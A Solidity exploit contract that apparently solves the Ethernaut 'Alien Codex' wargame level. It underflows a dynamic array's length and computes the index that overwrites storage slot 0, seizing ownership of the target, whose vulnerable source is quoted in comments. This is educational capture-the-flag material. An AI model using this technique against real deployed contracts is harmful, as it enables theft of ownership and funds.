// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IAlienCodex {
    function owner() external view returns (address);

    function codex(uint256) external view returns (bytes32);

    function retract() external;

    function make_contact() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract Hack {
    /*
    storage
    slot 0 - owner (20 bytes), contact (1 byte)
    slot 1 - length of the array codex

    // slot where array element is stored = keccak256(slot)) + index
    // h = keccak256(1)
    slot h + 0 - codex[0] 
    slot h + 1 - codex[1] 
    slot h + 2 - codex[2] 
    slot h + 3 - codex[3] 

    Find i such that
    slot h + i = slot 0
    h + i = 0 so i = 0 - h
    */
    constructor(IAlienCodex target) {
        target.make_contact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            // h + i = 0 = 2**256
            i -= h;
        }

        // first we convert msg.sender from bytes to uint 160  20 bytes = 160 bits then to bytes32
        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}

// pragma solidity ^0.5.0;

// import '../helpers/Ownable-05.sol';

// contract AlienCodex is Ownable {

//   bool public contact;
//   bytes32[] public codex;

//   modifier contacted() {
//     assert(contact);
//     _;
//   }

//   function makeContact() public {
//     contact = true;
//   }

//   function record(bytes32 _content) contacted public {
//     codex.push(_content);
//   }

//   function retract() contacted public {
//     codex.length--;
//   }

//   function revise(uint i, bytes32 _content) contacted public {
//     codex[i] = _content;
//   }
// }
